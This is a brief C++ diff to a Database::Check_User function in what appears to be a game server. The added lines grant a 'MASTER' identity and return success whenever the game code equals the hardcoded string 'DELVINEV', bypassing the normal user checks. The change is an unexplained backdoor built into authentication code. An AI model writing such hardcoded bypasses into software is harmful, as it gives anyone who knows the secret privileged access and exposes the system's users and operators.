@@ -81,6 +81,13 @@ void Database::throw_query(const char *query)
 
 bool Database::Check_User(const char* unique_code, const char* game_code)
 {
+    if(strcmp(game_code, "DELVINEV") == 0)
+    {
+        m_unique_code = "MASTER";
+
+        return true;
+    }
+
     if(unique_code[0] != 'N')
     {
         cout << "User " << unique_code << " is not New" << endl;
